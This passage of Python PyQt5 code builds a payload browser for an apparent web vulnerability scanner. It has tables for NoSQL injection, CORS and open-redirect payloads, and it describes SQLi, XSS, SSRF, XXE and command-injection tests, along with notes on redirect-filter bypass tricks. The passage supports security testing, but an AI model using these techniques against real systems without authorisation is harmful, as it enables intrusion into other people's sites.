    regex_rows = [[p, "$regex extraction probe"] for p in _NOSQLI_REGEX_EXTRACT_PROBES]
    rce_rows   = [[p, "RCE / admin command injection"] for p in _NOSQLI_RCE_PAYLOADS]
    err_rows   = [[p, "Error pattern (regex) — reveals injection success"]
                  for p in _NOSQLI_ERROR_PATTERNS]

    sections = [
        ("Fuzz Strings",      ["Payload",  "Notes"],                 fuzz_rows),
        ("Char Probes",       ["Char",     "Notes"],                 char_rows),
        ("Boolean Probes",    ["Payload",  "Condition", "Notes"],    bool_rows),
        ("Operator Params",   ["Suffix",   "Value",     "Notes"],    op_rows),
        ("Auth Bypass JSON",  ["JSON Body","Notes"],                  auth_rows),
        ("Logical Operators", ["Payload",  "Notes"],                 logic_rows),
        ("$where JavaScript", ["Payload",  "Condition", "Notes"],    where_rows),
        ("Timing Blind",      ["Payload",  "Expected",  "Notes"],    time_rows),
        ("$regex Extraction", ["Payload",  "Notes"],                  regex_rows),
        ("RCE Payloads",      ["Payload",  "Notes"],                  rce_rows),
        ("Error Patterns",    ["Pattern (regex)", "Notes"],           err_rows),
    ]
    return _make_tab_widget(sections)


def _build_cors() -> QTabWidget:
    probe_rows = [
        [tc_id, origin, desc, cls]
        for tc_id, origin, desc, cls in _CORS_PROBES
    ]
    sections = [
        ("CORS Probes",
         ["TC", "Origin Template", "Description", "Class"],
         probe_rows),
    ]
    return _make_tab_widget(sections)


def _build_openredirect() -> QTabWidget:
    payload_rows = [
        [lbl, template,
         _REDIR_NOTES.get(lbl, "Open redirect bypass technique")]
        for lbl, template in _REDIR_PAYLOADS
    ]
    sections = [
        ("Redirect Payloads",
         ["Label", "Value Template", "Notes"],
         payload_rows),
    ]
    return _make_tab_widget(sections)


_REDIR_NOTES = {
    "absolute-https":     "Standard absolute HTTPS redirect",
    "protocol-relative":  "Protocol-relative URL — inherits attacker scheme",
    "double-slash":       "Double slash — confuses some parsers",
    "backslash":          "Backslash treated as slash by some browsers",
    "url-encoded":        "URL-encoded colon/slash — may bypass string checks",
    "double-url-encoded": "Double URL-encoding — bypasses single-decode filters",
    "at-sign":            "@ trick — browser uses the part AFTER @ as the host",
    "fragment":           "Fragment anchor — some redirectors ignore the fragment",
    "crlf-location":      "CRLF injection → inject Location header",
    "javascript-scheme":  "javascript: URI — triggers JS in some redirect handlers",
    "whitelist-suffix":   "Appends .trusted to bypass suffix validation",
    "whitelist-prefix":   "Prepends trusted. to bypass prefix validation",
}


# ─────────────────────────────────────────────────────────────────────────────
# Scan type registry
# ─────────────────────────────────────────────────────────────────────────────

_SCAN_TYPES = [
    ("SSTI",          "Server-Side Template Injection\n"
                          "Injects arithmetic payloads into template engines.\n"
                          "Detects: Jinja2 · Twig · Freemarker · Mako · ERB · EJS\n"
                          "         Thymeleaf · Velocity · Smarty · Pebble · Razor\n"
                          "         JsRender · Jinjava/HuBL · Nunjucks · Tornado",
     _build_ssti),

    ("SQLi",          "SQL Injection\n"
                          "Tests 9 detection categories:\n"
                          "  error-based · boolean-based · time-based · union-based\n"
                          "  auth-bypass · login-specific · conditional-error\n"
                          "  verbose-error · out-of-band (OAST)",
     _build_sqli),

    ("XSS",           "Cross-Site Scripting (Reflected)\n"
                          "Phase 1: char probes + keyword probes to fingerprint WAF\n"
                          "Phase 2: build filter model\n"
                          "Phase 3: select context-appropriate payloads\n"
                          "Phase 4: fire payloads, detect reflections",
     _build_xss),

    ("CMDi",          "OS Command Injection\n"
                          "Tests output-based, time-based blind, and error-based.\n"
                          "Covers Unix and Windows separators, shell metacharacters,\n"
                          "backtick, $() inline execution, and quote-breaking.",
     _build_cmdi),

    ("LFI",           "Local File Inclusion / Path Traversal\n"
                          "Uses SecLists LFI-Jhaddix.txt wordlist (900+ payloads).\n"
                          "Detects successful inclusion via file-content signatures\n"
                          "(/etc/passwd patterns, win.ini sections, etc.).",
     _build_lfi),

    ("SSRF",          "Server-Side Request Forgery\n"
                          "10 phases: loopback · bypass · admin paths · cloud metadata\n"
                          "           CRLF · OOB · Referer · partial URL · Gopher\n"
                          "           protocol smuggling (Redis, FastCGI, MySQL, SMTP)",
     _build_ssrf),

    ("XXE",           "XML External Entity Injection\n"
                          "13 phases: file read · SSRF · blind OOB · error-based\n"
                          "           local DTD repurposing · XInclude · SAML/SSO\n"
                          "           billion-laughs DoS · SOAP discovery",
     _build_xxe),

    ("NoSQLi",        "NoSQL Injection (MongoDB)\n"
                          "6 phases: fuzz strings · operator injection · $where JS\n"
                          "          timing blind · $regex extraction · RCE",
     _build_nosqli),

    ("CORS",          "CORS Misconfiguration\n"
                          "22 probes covering: arbitrary origin · subdomain bypass\n"
                          "null origin · localhost · case mutation · port variation\n"
                          "scheme confusion · regex bypass",
     _build_cors),

    ("OpenRedirect", "Open Redirect\n"
                          "30+ payloads: absolute/relative · slash tricks\n"
                          "URL encoding · @ separator · fragment · CRLF injection\n"
                          "scheme confusion · whitelist bypass",
     _build_openredirect),
]


# ─────────────────────────────────────────────────────────────────────────────
# Main dialog
# ─────────────────────────────────────────────────────────────────────────────

class PayloadsDialog(QWidget):
    """
    Large payload browser dialog.

    Layout:
        ┌─────────────────────────────────────────────────────┐
        │  Search: [_____________]          [Copy] [Close]    │
        ├──────────────┬──────────────────────────────────────┤
        │  Scan Types  │  Payload Tabs                        │
        │              │  ┌────────┬────────┬────────┐        │
        │  • SSTI      │  │ Tab 1  │ Tab 2  │  ...   │        │
        │  • SQLi      │  ├────────┴────────┴────────┤        │
        │  • XSS       │  │  Payload table           │        │
        │  • ...       │  │  ...                     │        │
        │              │  └──────────────────────────┘        │
        ├──────────────┴──────────────────────────────────────┤
        │  Details / Notes                                    │
        └─────────────────────────────────────────────────────┘
    """

    def __init__(self, parent=None):
        super().__init__(parent, Qt.Window)
        self.setWindowTitle("Payloads Browser")
        self.resize(1200, 750)
        self.setMinimumSize(900, 550)
        self.setStyleSheet(f"background-color: {_BG_DARK}; color: {_TEXT_PRIMARY};")

        self._tab_cache: Dict[str, QTabWidget] = {}

        self._build_ui()
        # Select first item
        self._list.setCurrentRow(0)

    # ── UI construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(8, 8, 8, 8)
        root.setSpacing(6)

        # ── Top bar: search + buttons ─────────────────────────────────────────
        top_bar = QHBoxLayout()

        search_lbl = QLabel("Filter:")
        search_lbl.setStyleSheet(f"color: {_TEXT_MUTED};")
        top_bar.addWidget(search_lbl)

        self._search = QLineEdit()
        self._search.setPlaceholderText("Type to filter payloads…")
        self._search.setStyleSheet(_QSS_SEARCH)
        self._search.setFixedHeight(28)
        self._search.textChanged.connect(self._on_search_changed)
        top_bar.addWidget(self._search, 1)

        top_bar.addStretch()

        self._copy_btn = QPushButton("Copy Selected")
        self._copy_btn.setStyleSheet(_QSS_BTN)
        self._copy_btn.setFixedHeight(28)
        self._copy_btn.clicked.connect(self._copy_selected)
        top_bar.addWidget(self._copy_btn)

        close_btn = QPushButton("Close")
        close_btn.setStyleSheet(_QSS_BTN)
        close_btn.setFixedHeight(28)
        close_btn.clicked.connect(self.close)
        top_bar.addWidget(close_btn)

        root.addLayout(top_bar)

        # ── Main splitter ─────────────────────────────────────────────────────
        outer_split = QSplitter(Qt.Vertical)

        # Top: list + tabs
        top_widget = QWidget()
        top_lay = QHBoxLayout(top_widget)
        top_lay.setContentsMargins(0, 0, 0, 0)
        top_lay.setSpacing(6)

        inner_split = QSplitter(Qt.Horizontal)

        # Left: scan type list
        left = QWidget()
        left_lay = QVBoxLayout(left)
        left_lay.setContentsMargins(0, 0, 0, 0)
        left_lay.setSpacing(2)

        left_hdr = QLabel("Scan Types")
        left_hdr.setFont(QFont("Segoe UI", 10, QFont.Bold))
        left_hdr.setStyleSheet(
            f"color: {_TEXT_BRIGHT}; padding: 4px 6px; "
            f"background-color: {_BG_MED}; border-bottom: 1px solid {_BORDER};"
        )
        left_lay.addWidget(left_hdr)

        self._list = QListWidget()
        self._list.setStyleSheet(_QSS_LIST)
        self._list.setFixedWidth(175)
        for name, desc, builder in _SCAN_TYPES:
            item = QListWidgetItem(name)
            item.setData(Qt.UserRole, (name, desc, builder))
            item.setSizeHint(QSize(160, 40))
            self._list.addItem(item)
        self._list.currentItemChanged.connect(self._on_scan_type_changed)
        left_lay.addWidget(self._list)
        inner_split.addWidget(left)

        # Right: stacked area (description + tabs)
        right = QWidget()
        right_lay = QVBoxLayout(right)
        right_lay.setContentsMargins(0, 0, 0, 0)
        right_lay.setSpacing(4)

        # Scan type description
        self._desc_lbl = QLabel()
        self._desc_lbl.setStyleSheet(
            f"color: {_TEXT_MUTED}; font-size: 10px; "
            f"padding: 6px 8px; background-color: {_BG_MED}; "
            f"border: 1px solid {_BORDER}; border-radius: 3px;"
        )
        self._desc_lbl.setWordWrap(True)
        self._desc_lbl.setMinimumHeight(50)
        right_lay.addWidget(self._desc_lbl)

        # Tab area
        self._tab_area = QWidget()
        self._tab_area_lay = QVBoxLayout(self._tab_area)
        self._tab_area_lay.setContentsMargins(0, 0, 0, 0)
        right_lay.addWidget(self._tab_area, 1)

        inner_split.addWidget(right)
        inner_split.setStretchFactor(0, 0)
        inner_split.setStretchFactor(1, 1)
        top_lay.addWidget(inner_split)

        outer_split.addWidget(top_widget)

        # Bottom: details pane
        self._detail = QTextEdit()
        self._detail.setReadOnly(True)
        self._detail.setStyleSheet(_QSS_DETAIL)
        self._detail.setMaximumHeight(100)
        self._detail.setPlaceholderText("Click a row to see details…")
        outer_split.addWidget(self._detail)

        outer_split.setStretchFactor(0, 3)
        outer_split.setStretchFactor(1, 1)
        root.addWidget(outer_split)

    # ── Event handlers ────────────────────────────────────────────────────────

    def _on_scan_type_changed(self, current: QListWidgetItem, previous: QListWidgetItem):
        if not current:
            return
        name, desc, builder = current.data(Qt.UserRole)
        self._desc_lbl.setText(desc)

        # Clear old tabs
        for i in reversed(range(self._tab_area_lay.count())):
            w = self._tab_area_lay.itemAt(i).widget()
            if w:
                self._tab_area_lay.removeWidget(w)
                w.setParent(None)

        # Build (or reuse cached) tab widget
        if name not in self._tab_cache:
            try:
                tw = builder()
            except Exception as exc:
                tw = QTabWidget()
                tw.setStyleSheet(_QSS_TABS)
                err_tab = _make_plain_tab(f"Error loading payloads:\n{exc}")
                tw.addTab(err_tab, "Error")
            self._tab_cache[name] = tw

        tw = self._tab_cache[name]
        self._tab_area_lay.addWidget(tw)

        # Connect cell-selection to detail pane for each table in each tab
        self._connect_tables(tw)

        # Re-apply current search filter
        self._on_search_changed(self._search.text())

    def _connect_tables(self, tw: QTabWidget):
        """Connect all tables inside tw to the detail pane."""
        for i in range(tw.count()):
            tab = tw.widget(i)
            if tab is None:
                continue
            for tbl in tab.findChildren(QTableWidget):
                tbl.itemSelectionChanged.connect(
                    lambda t=tbl: self._on_table_selection_changed(t)
                )

    def _on_table_selection_changed(self, tbl: QTableWidget):
        rows_data = []
        selected_rows = sorted({idx.row() for idx in tbl.selectedIndexes()})
        for r in selected_rows:
            row_cells = []
            for c in range(tbl.columnCount()):
                item = tbl.item(r, c)
                if item:
                    hdr = tbl.horizontalHeaderItem(c)
                    col_name = hdr.text() if hdr else str(c)
                    row_cells.append(f"{col_name}: {item.text()}")
            rows_data.append("\n".join(row_cells))
        self._detail.setPlainText("\n\n".join(rows_data))

    def _on_search_changed(self, text: str):
        """Filter visible rows in all tables in the current tab widget."""
        text = text.strip().lower()
        current = self._list.currentItem()
        if not current:
            return
        name, _, _ = current.data(Qt.UserRole)
        if name not in self._tab_cache:
            return
        tw = self._tab_cache[name]
        for i in range(tw.count()):
            tab = tw.widget(i)
            if tab is None:
                continue
            for tbl in tab.findChildren(QTableWidget):
                for r in range(tbl.rowCount()):
                    match = not text
                    if text:
                        for c in range(tbl.columnCount()):
                            item = tbl.item(r, c)
                            if item and text in item.text().lower():
                                match = True
                                break
                    tbl.setRowHidden(r, not match)

    def _copy_selected(self):
        """Copy all selected payload cells to clipboard."""
        from PyQt5.QtWidgets import QApplication
        current = self._list.currentItem()
        if not current:
            return
        name, _, _ = current.data(Qt.UserRole)
        if name not in self._tab_cache:
            return
        tw = self._tab_cache[name]
        copied = []
        for i in range(tw.count()):
            tab = tw.widget(i)
            if tab is None:
                continue
            for tbl in tab.findChildren(QTableWidget):
                for idx in tbl.selectedIndexes():
                    item = tbl.item(idx.row(), idx.column())
                    if item:
                        copied.append(item.text())
        if copied:
            QApplication.clipboard().setText("\n".join(copied))
            self._detail.setPlainText(f"Copied {len(copied)} cell(s) to clipboard.")
